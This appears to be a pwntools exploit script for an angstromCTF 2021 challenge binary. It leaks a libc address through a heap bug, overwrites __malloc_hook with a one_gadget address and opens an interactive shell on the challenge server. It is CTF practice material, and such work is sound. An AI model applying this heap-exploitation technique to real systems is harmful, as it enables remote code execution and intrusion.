from pwn import *

e = ELF("./carpal_tunnel_syndrome")
libc = ELF("./libc-2.31.so")
#ld = ELF("./ld-2.31.so")

context.binary = e
context.terminal = ["konsole", "-e"]

p = process([e.path])
p = remote("pwn.2021.chall.actf.co", 21840)




def mark(x, y):
    p.sendlineafter(": ", "1")
    p.sendlineafter(": ", "{} {}".format(x, y))
    
def view(x, y):
    p.sendlineafter(": ", "2")
    p.sendlineafter(": ", "{} {}".format(x, y))


def reset(i, c):
    p.sendlineafter(": ", "3")
    p.sendlineafter(": ", str(i))
    p.sendlineafter(": ", ["r", "c"][c])


def check_specific(i, c):
    p.sendlineafter(": ", "4")
    p.sendlineafter(": ", str(i))
    p.sendlineafter(": ", ["r", "c"][c])

def check(c, l, n):
    p.sendlineafter(": ", "5")
    p.sendlineafter("? ", ["n", "y"][c])
    p.sendlineafter(": ", str(l))
    p.sendlineafter(": ", n)
    

def change(m):
    p.sendlineafter(": ", "6")
    p.sendafter(": ", str(m))



context.log_level="debug"




p.sendlineafter(": ", "AAAA")


for i in range(5):
    mark(i, 4)
    

check(1, 0x500, "BBBB")



for i in range(5):
    mark(i, 3)
    
check(1, 0x500, "BBBB")


reset(4, 0)

reset(3, 0)

s = "\x60"

for i in range(5):
    for j in range(1, 0x100):
        change(s+chr(j)+"\x00")

        mark(2, 0)
        mark(2, 1)

        mark(2, 2)
        mark(2, 4)


        check_specific(2, 1)



        if "bingo" in p.recvline():
            s += chr(j)
            print("-"*50, s)
            break


libc.address = u64(s.ljust(8, "\x00")) - 0x1ebc60

print("libc", hex(libc.address))




change("AAAAAAAA")


for i in range(5):
    mark(i, 2)
    

check(1, 0x500, "BBBB")



for i in range(5):
    mark(i, 1)
    
check(1, 0x500, "BBBB")



reset(2, 0)


change(p64(libc.sym["__malloc_hook"]))


mark(1, 2)


change("AAAA")

for i in range(5):
    mark(i, 0)



og = 0xe6c81


addr = libc.address + og

gdb.attach(p, """break * {}\nc""".format(hex(addr)))




check(0, 0x20, "BBBB")
check(0, 0x20, p64(addr))


reset(0, 0)




p.interactive()



















